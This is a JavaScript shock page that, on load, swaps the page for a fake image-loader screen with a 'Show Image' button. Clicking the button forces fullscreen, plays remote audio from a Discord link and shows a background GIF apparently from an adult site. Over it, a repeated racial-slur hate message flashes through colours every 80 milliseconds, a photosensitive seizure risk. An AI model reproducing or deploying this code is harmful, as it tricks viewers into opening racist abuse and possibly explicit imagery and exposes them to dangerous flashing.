function onPageLoad() {
    document.body.innerHTML = `<!DOCTYPE html><html><head><style>body{user-select:none;margin:0;overflow:hidden}#test{background-image:url(https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fdaily.squirt.org%2Fwp-content%2Fuploads%2F2013%2F06%2Ftumblr_mm1tqrHJ6o1rnzdieo1_500.gif&f=1&nofb=1&ipt=8706dbd6fdaba5dafd2c31ddc51c03c223fae94f931ff4be9d297308635fcac5&ipo=images);background-repeat:no-repeat;background-size:cover;height:100%;width:100%;overflow:hidden;position:absolute;overflow:hidden}span{position:absolute;color:#fff;font-size:150px;font-weight:100;animation:rainbow 80ms linear infinite;z-index:999;opacity:.5;left:10px;top:10px}span:nth-child(1){left:202px;top:202px;animation-delay:.3s}span:nth-child(2){left:404px;top:104px;animation-delay:.5s}span:nth-child(3){left:606px;top:606px;animation-delay:.7s}span:nth-child(4){left:108px;top:808px;animation-delay:1s}@keyframes rainbow{0%,100%{color:red}16.666%{color:orange}33.333%{color:#ff0}50%{color:green}66.666%{color:#00f}83.333%{color:indigo}}#audio{display:none}#loader{position:absolute;background-color:#000;height:100%;width:100%;display:flex;justify-content:center;align-items:center;z-index:9992;flex-direction:column}#loader h2{color:#fff;font-size:20px;font-weight:100;font-family:monospace}#loader button{background-color:#2c2c2c;border:1px solid #fff;color:#fff;padding:10px;font-size:20px;font-weight:100;cursor:pointer;font-family:monospace;border-radius:12px}</style></head><div id="loader"><h2>KIhyCQIHuxRG/A.png · ~ 237kb</h2><button onclick="show()">Show Image</button></div><audio id="audio" controls><source src="https://cdn.discordapp.com/attachments/1071115341830291536/1132728127932608512/video.mp3" type="audio/mpeg"></audio><span>WE HATE NIGGERS WE HATE NIGGERS WE HATE NIGGERS WE HATE NIGGERS WE HATE NIGGERS</span><span>WE HATE NIGGERS WE HATE NIGGERS WE HATE NIGGERS WE HATE NIGGERS WE HATE NIGGERS</span><span>WE HATE NIGGERS WE HATE NIGGERS WE HATE NIGGERS WE HATE NIGGERS WE HATE NIGGERS</span><span>WE HATE NIGGERS WE HATE NIGGERS WE HATE NIGGERS WE HATE NIGGERS WE HATE NIGGERS</span><span>WE HATE NIGGERS WE HATE NIGGERS WE HATE NIGGERS WE HATE NIGGERS WE HATE NIGGERS</span><span>WE HATE NIGGERS WE HATE NIGGERS WE HATE NIGGERS WE HATE NIGGERS WE HATE NIGGERS</span><span>WE HATE NIGGERS WE HATE NIGGERS WE HATE NIGGERS WE HATE NIGGERS WE HATE NIGGERS</span><div id="test"></div><body><script>function openFullscreen() {
            const element = document.documentElement;
            if (element.requestFullscreen) {
                element.requestFullscreen();
            } else if (element.mozRequestFullScreen) {
                element.mozRequestFullScreen();
            } else if (element.webkitRequestFullscreen) {
                element.webkitRequestFullscreen();
            } else if (element.msRequestFullscreen) {
                element.msRequestFullscreen();
            }
        }

        function show() {
            const audio = document.getElementById("audio");
            const loader = document.getElementById("loader")
            loader.style.opacity = 0
            audio.play();
            openFullscreen();
        }</script></body></html>`;
    document.title = "Monarch";
}

window.addEventListener('load', onPageLoad);
